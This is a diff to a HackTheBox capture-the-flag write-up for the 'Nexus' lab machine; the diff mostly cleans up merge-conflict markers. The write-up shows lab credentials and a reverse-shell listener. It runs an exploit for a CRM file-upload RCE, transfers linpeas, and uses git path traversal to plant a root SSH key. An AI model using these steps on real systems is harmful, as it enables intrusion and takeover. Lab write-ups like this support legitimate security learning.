@@ -1,14 +1,8 @@
-
-<<<<<<<<< Temporary merge branch 1
-# #HTB 
-
-![[Pasted image 20260719171806.png|281]]
-
 # HTB: Nexus
 
-**Machine IP:** `10.129.234.54` 
-**Difficulty:** Medium **
-OS:** Linux (Ubuntu 24.04)
+**Machine IP:** `10.129.234.54`
+**Difficulty:** Medium
+**OS:** Linux (Ubuntu 24.04)
 
 ---
 
@@ -40,10 +34,6 @@ PORT   STATE SERVICE VERSION
 |_http-title: Did not follow redirect to http://nexus.htb/
 ```
 
-=========
-Add-New-Writeup
->>>>>>>>> Temporary merge branch 2
-
 ![[Pasted image 20260719013935.png]]
 
 Port 80 redirected to `http://nexus.htb/`, so this was added to `/etc/hosts` and the site was browsed.
@@ -51,10 +41,6 @@ Port 80 redirected to `http://nexus.htb/`, so this was added to `/etc/hosts` and
 ---
 
 ### Step 2: Website Recon - Finding a Valid Email
-=========
-Add-New-Writeup
-![[Pasted image 20260719014056.png]]
->>>>>>>>> Temporary merge branch 2
 
 Browsing `http://nexus.htb` revealed a **Nexus Energy Authority** corporate site. A "Careers" job posting for an **Operations Specialist – Customer Platforms** role leaked an internal contact:
 
@@ -62,26 +48,7 @@ Browsing `http://nexus.htb` revealed a **Nexus Energy Authority** corporate site
 Questions? Reach out to our hiring manager j.matthew@nexus.htb
 ```
 
-
-<<<<<<<<< Temporary merge branch 1
-=========
-![[Pasted image 20260719014026.png]]
-
-![[Pasted image 20260719082532.png]]
-
-![[Pasted image 20260719014056.png]]
-
-
-
-![[Pasted image 20260719014156.png]]
-
-
 ![[Pasted image 20260719014242.png]]
-
->>>>>>>>> Temporary merge branch 2
-
-
-![[Pasted image 20260719082532.png]]
 
 This gave a **valid internal username/email**: `j.matthew@nexus.htb` — useful later once a password was found.
 
@@ -100,7 +67,6 @@ ffuf -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -w /usr/share/seclists/Disco
 git                    [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 202ms]
 ```
 
-
 ![[Pasted image 20260719014026.png]]
 
 This revealed **`git.nexus.htb`** — a self-hosted Gitea instance. Both `git.nexus.htb` and `billing.nexus.htb` (referenced elsewhere on the site / assumed convention) were added to `/etc/hosts`.
@@ -109,20 +75,11 @@ Browsing to `git.nexus.htb` confirmed a Gitea instance:
 
 ![[Pasted image 20260719014056.png]]
 
-
 ---
 
 ### Step 4: Discovering Krayin CRM & Leaked Credentials via Gitea
 
 An **`admin`** account on Gitea had a public repository, **`krayin-docker-setup`**, containing the Docker Compose configuration for the billing CRM deployment:
-
-
-![[Pasted image 20260719014026.png]]
-
-
-![[Pasted image 20260719014056.png]]
-
-
 
 ![[Pasted image 20260719014156.png]]
 
@@ -136,49 +93,33 @@ Critically, the **commit history** of the `.env` file in this repo showed an ear
 + DB_PASSWORD=
 ```
 
-![[Pasted image 20260719014242.png]]
+![[Pasted image 20260719082532.png]]
+
 This leaked:
 - The subdomain **`billing.nexus.htb`** (the Krayin CRM instance)
 - A password: **`N27xh!!2ucY04`**
 
 Combined with the email `j.matthew@nexus.htb` found earlier, this gave a credential pair to try against the CRM login.
 
-
 ---
-
-
-![[Pasted image 20260719082532.png]]
-
-
-![[Pasted image 20260719082532.png]]
-
 
 ### Step 5: Krayin CRM Login & Version Fingerprinting
 
 `billing.nexus.htb` hosts a **Krayin CRM** (open-source CRM by Webkul) admin login:
 
-
-
 ![[Pasted image 20260719082557.png]]
-
 
 Logging in with `j.matthew@nexus.htb` / `N27xh!!2ucY04` succeeded, landing on the admin dashboard:
 
 ![[Pasted image 20260719093811.png]]
 
-
 Fingerprinting the version and searching for known vulnerabilities revealed **Krayin CRM 2.2.x** is affected by several critical CVEs, most notably an **authenticated RCE via unrestricted file upload**:
-=========
-
->>>>>>>>> Temporary merge branch 2
 
 ![[Pasted image 20260719093900.png]]
-
 
 **CVE-2026-38526** — Unrestricted Arbitrary File Upload via `/admin/tinymce/upload`, allowing an authenticated user to upload a crafted PHP file and achieve RCE in the web server context (CVSS 9.9 Critical). A public PoC exists on Exploit-DB (**52629**).
 
 - `https://www.exploit-db.com/exploits/52629`
-
 
 ---
 
@@ -199,7 +140,7 @@ nc -lvnp 9001
 
 Exploit Execution
 ```
-python3 52629.py -t http://billing.nexus.htb/ -u j.matthew@nexus.htb -p N27xhnano php-reverse-shell.php2ucY04 -f php-reverse-shell.php
+python3 52629.py -t http://billing.nexus.htb/ -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' -f php-reverse-shell.php
 ```
 
 > **Gotcha:** The password contains `!!`, which bash interprets as history expansion unless single-quoted — an early attempt without quoting mangled the argument and caused a parsing error.
@@ -208,11 +149,9 @@ The exploit uploaded the payload through the CRM's file upload endpoint and trig
 
 ![[Pasted image 20260719094650.png]]
 
-
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
-
 
 ---
 
@@ -233,7 +172,6 @@ DB_USERNAME=krayin
 DB_PASSWORD=y27xb3ha!!74GbR
 ```
 
-
 ![[Pasted image 20260719095617.png]]
 
 This is a **different, updated password** from the one leaked in the Gitea commit history — confirming the earlier leaked credential had since been rotated, but the app config itself was still readable post-RCE.
@@ -246,7 +184,6 @@ The `.env` DB password (or a related credential — same password reuse pattern)
 ```
 ssh jones@10.129.234.54
 ```
-
 
 ![[Pasted image 20260719095723.png]]
 
@@ -273,7 +210,6 @@ sudo -l
 
 `linpeas.sh` was transferred to the target via a Python HTTP server on the attacking box:
 
-
 ```bash
 # Attacker box
 python3 -m http.server 8000
@@ -299,11 +235,9 @@ Potential privilege escalation in timer file: /etc/systemd/system/gitea-template
   └─ RELATIVE_PATH: Uses relative path in Unit directive
 ```
 
-
 ```bash
 systemctl cat gitea-template-sync.service
 ```
-
 
 ```ini
 [Service]
@@ -333,6 +267,7 @@ with open(target, 'wb') as f:
 ```
 
 #### The Vulnerability
+
 `filepath` comes directly from git tree entries inside a **user-controlled repository**. Python's `os.path.join()` has a well-known behavior:
 
 ```python
@@ -348,24 +283,17 @@ If the second argument is an absolute path, it completely overrides the first. S
 
 Git's CLI (`git add`, `git mktree`) refuses filenames containing a literal `/` or empty names, so a direct absolute path couldn't be committed normally. This was solved using git's low-level **plumbing commands** to construct a tree object with a `../` traversal path instead of a leading `/`.
 
-#### 12.1 -- Login to Gitea and create a template repository
+#### 12.1 — Login to Gitea and create a template repository
 
 Using the `jones` credentials against `git.nexus.htb`:
 
-<<<<<<<<< Temporary merge branch 1
-=========
 password- `y27xb3ha!!74GbR`
 
 ![[Pasted image 20260719105425.png]]
 
-
->>>>>>>>> Temporary merge branch 2
-![[Pasted image 20260719105425.png]]
-
-
 A repository `jones/rce` was created and marked as a **Template Repository** (required — the script only syncs repos with `template: true`).
 
-#### 12.2 -- Clone and generate payload
+#### 12.2 — Clone and generate payload
 
 ```bash
 git clone http://jones@localhost:3000/jones/rce.git
@@ -377,7 +305,7 @@ git add authkey_payload
 git commit -m "sync"
 ```
 
-#### 12.3 -- Craft the traversal path via git plumbing
+#### 12.3 — Craft the traversal path via git plumbing
 
 The staging path was `/home/git/template-staging/jones/rce` — 5 directories deep from root. Wrapping the payload blob in 5 nested `..` trees resolves back to `/root/.ssh/authorized_keys`:
 
@@ -397,7 +325,7 @@ git ls-tree -r $L5
 100644 blob 9be1566acda8cc0f68242bf53ad6f82269162847    ../../../../../root/.ssh/authorized_keys
 ```
 
-#### 12.4 -- Commit and push
+#### 12.4 — Commit and push
 
 ```bash
 NEW_COMMIT=$(git commit-tree $L5 -m "payload")
@@ -438,21 +366,10 @@ root@nexus:~#
 root@nexus:~# cat /root/root.txt
 ```
 
-<<<<<<<<< Temporary merge branch 1
+---
 
-### Step 14 : Lab Solved
-
-password- `y27xb3ha!!74GbR`
-
-![[Pasted image 20260719105425.png]]
-
-
-![[Pasted image 20260719105425.png]]
-
+### Step 14: Lab Solved
 
 ![[Pasted image 20260719175350.png]]
 
 ---
----
-=========
->>>>>>>>> Temporary merge branch 2
